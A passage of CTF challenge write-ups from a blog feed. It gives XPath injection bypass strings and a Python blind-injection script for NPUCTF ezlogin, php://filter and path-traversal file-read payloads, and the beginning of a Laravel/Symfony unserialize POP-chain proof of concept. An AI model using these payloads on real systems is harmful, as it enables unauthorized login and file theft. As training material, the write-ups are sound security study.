punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>tony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>cc20f43c8c24dbc0b2539489b113277a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>secret</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>flag</span><span class="token punctuation">></span></span>flag&#123;My_f1rst_xp4th_iNjecti0n&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>flag</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>secret</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.phpï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/root/users/user[username/text()='"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password/text()='"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2>Welcome&lt;/h2>'</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />ID:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />Username:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="å¸¸è§„æ³¨å…¥"><a href="#å¸¸è§„æ³¨å…¥" class="headerlink" title="å¸¸è§„æ³¨å…¥"></a>å¸¸è§„æ³¨å…¥</h5><p>è¿™æ®µæµ‹è¯•ä»£ç çš„æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery"><span class="token punctuation">/</span>root<span class="token punctuation">/</span>users<span class="token punctuation">/</span>user<span class="token punctuation">[</span>username<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">''</span> <span class="token keyword-operator operator">and</span> password<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‡èƒ½å¯†ç ï¼š</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"admin' or '1"</span>p <span class="token operator">=</span> <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç»“æœï¼š</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery"><span class="token punctuation">/</span>root<span class="token punctuation">/</span>users<span class="token punctuation">/</span>user<span class="token punctuation">[</span>username<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'admin'</span> <span class="token keyword-operator operator">or</span> <span class="token string">'1'</span> <span class="token keyword-operator operator">and</span> password<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è‹¥ä¸çŸ¥é“ç”¨æˆ·ååˆ™å¯ä»¥å†åŠ ä¸ªor</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or 1 or '1"</span>p <span class="token operator">=</span> <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery"><span class="token punctuation">/</span>root<span class="token punctuation">/</span>users<span class="token punctuation">/</span>user<span class="token punctuation">[</span>username<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">''</span> <span class="token keyword-operator operator">or</span> <span class="token number">1</span> <span class="token keyword-operator operator">or</span> <span class="token string">'1'</span> <span class="token keyword-operator operator">and</span> password<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ˜¯æ ¹æ®XMLç‰¹æ€§æ¥çš„</p><blockquote><p>æŸ¥è¯¢å¦‚æœä¸æ˜¯ç”¨[é”®=â€™å€¼â€™]è¿™ç§æ–¹å¼çš„æŸ¥è¯¢ï¼Œåªä¼šè¿”å›æ‰€æœ‰è·¯å¾„æ ‡ç­¾çš„å€¼<br>å¦‚æœå¸¦æœ‰[é”®=â€™å€¼â€™]çš„æŸ¥è¯¢ï¼Œä¼šè¿”å›å’Œè¯¥è·¯å¾„ç›¸åŒçš„æ‰€æœ‰è·¯å¾„å’Œè¯¥ç±»è·¯å¾„ä¹‹ä¸‹èŠ‚ç‚¹çš„æ‰€æœ‰çš„å€¼</p></blockquote><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>1.åˆ¤æ–­æ ¹èŠ‚ç‚¹æ•°é‡</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or count(/)=1 or '1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>count(/)=1</code> ä¸€ç›´åˆ° <code>count(/)=n</code>ï¼Œåˆ¤æ–­å‡ºæ ¹èŠ‚ç‚¹æœ‰å‡ ä¸ªã€‚</p><p>è‹¥<code>u = &quot;&#39; or count(/)=1 or &#39;1&quot;</code>è¿”å›æ­£å¸¸ï¼Œè¯´æ˜åªæœ‰ 1 ä¸ªæ ¹èŠ‚ç‚¹ã€‚ä¸‹æ–‡åŒç†ã€‚</p><p>2.è·å–æ ¹èŠ‚ç‚¹å</p><p>é¦–å…ˆè·å–åå­—é•¿åº¦</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or string-length(name(/*[1]))=1 or '1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥è·å–é€ä¸ªå­—ç¬¦è·å–åå­—</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or substring(name(/*[1]), 1, 1)='a' or '1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å›åˆ°é¢˜ç›®ï¼Œå…ˆçŒœæ ¹èŠ‚ç‚¹ï¼Œè„šæœ¬å¦‚ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://9dd95219-88d2-4ba7-b7b8-7ef112820c15.node4.buuoj.cn:81/'</span>head <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/xml"</span><span class="token punctuation">&#125;</span>find <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;input type="hidden" id="token" value="(.*?)" />'</span><span class="token punctuation">)</span>strs <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> find<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token comment"># çŒœæµ‹æ ¹èŠ‚ç‚¹åç§°</span>        payload_1 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># çŒœæµ‹å­èŠ‚ç‚¹åç§°</span>        payload_2 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># çŒœæµ‹accountsçš„èŠ‚ç‚¹</span>        payload_3 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># çŒœæµ‹userèŠ‚ç‚¹</span>        payload_4 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># è·‘ç”¨æˆ·åå’Œå¯†ç </span>        payload_username <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        payload_password <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>payload_1<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"éæ³•æ“ä½œ"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼Œxpathæ˜¯ä»[1]å¼€å§‹çš„</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826214759893.png"></p><p>rootçš„å­èŠ‚ç‚¹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826215028755.png"></p><p>/root/accountsçš„å­èŠ‚ç‚¹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220116565.png"></p><p>å°±æ˜¯è¿™æ ·ä¸€ä¸ªä¸€ä¸ªè·‘å°±è¡Œäº†ã€‚</p><p>è·‘å‡ºæ¥å¤§æ¦‚å½¢å¼å°±æ˜¯è¿™æ ·</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>accounts</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>gtfly123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>e10adc3949ba59abbe56e057f20f883e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>adm1n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>accounts</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜å¯ä»¥è¿™ç§å½¢å¼ï¼š</p><pre class="line-numbers language-none"><code class="language-none">substring(string(&#x2F;*[1]&#x2F;*[1]&#x2F;*[2]&#x2F;*[3]),1,1)&#x3D;&#39;a&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨adm1n@gtfly123ç™»å½•</p><p>ç™»å½•åå‘ç°base64ï¼Œè§£ç ï¼šflag is in /flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220844743.png" alt="image-20210826220844743"></p><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œæç¤ºnononoã€‚æœ‰è¿‡æ»¤ï¼Œæœ€åç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¿™è¦æ˜¯ä¸è¯´ï¼Œæ²¡æœ‰æºç çœŸæƒ³ä¸åˆ°å•Šï¼Œå°½é‡å¤šåšå°è¯•å§ã€‚</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;pHp:&#x2F;&#x2F;filter&#x2F;convert.BAse64-encode&#x2F;resource&#x3D;&#x2F;flag?file&#x3D;pHp:&#x2F;&#x2F;FiltEr&#x2F;convert.BAse64-eNcode&#x2F;resource&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¯•äº†ä¸‹å‘ç°ï¼Œ<code>convert resource</code>ä¸èƒ½ä¿®æ”¹å¤§å°å†™ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</title>
      <link href="/p/74684521.html"/>
      <url>/p/74684521.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç»™äº†ä¸‰ä¸ªé¡µé¢çš„æºç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/image-20210826202704265.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ–‡ä»¶åŒ…å«ï¼Œç­¾åˆ°é¢˜ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</title>
      <link href="/p/3199619840.html"/>
      <url>/p/3199619840.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//backup in source.tar.gz</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified type-declaration"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$payload</span><span class="token operator">=</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>çœ‹ç€ä¸»é¡µä»£ç ï¼Œå¾ˆæ˜æ˜¾æ˜¯ååºåˆ—åŒ–ï¼Œå…ˆä¸‹è½½æºç ï¼Œçœ‹é¢˜ç›®å¯å¾—æ˜¯Laravelæ¡†æ¶ï¼Œå¾ˆæœ‰éš¾åº¦ã€‚</p><p>ä»£ç é‡å¤ªå¤§ï¼Œæˆ‘è¿˜æ˜¯è€è€å®å®è·Ÿç€WPå­¦8ã€‚</p><ul><li><p>æ€è·¯</p><p>1ã€é¦–å…ˆå…¨å±€æœç´¢<code>__destruct</code>è¿™æ ·çš„é­”æœ¯æ–¹æ³•</p><p>2ã€çœ‹çœ‹æœ¬ç±»ä¸­æœ‰æ²¡æœ‰å¯æ§çš„å‘½ä»¤æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæ²¡æœ‰å°±æ‰¾æœ‰æ²¡æœ‰é‚£ä¸ªæ–¹æ³•å¯ä»¥è°ƒç”¨å…¶ä»–ç±»</p><p>3ã€ç„¶åå…¨å±€æœç´¢èƒ½åˆ©ç”¨çš„å¯æ§å‡½æ•°</p></li></ul><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache</span><span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheItem</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>CacheItem</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PhpArrayAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TagAwareAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$deferred</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$pool</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flight'</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">CacheItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PhpArrayAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>TagAwareAdapter</span><span class="token punctuation">;</span>    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TagAwareAdapter</span><span class="token punctuation">(</span><span class="token 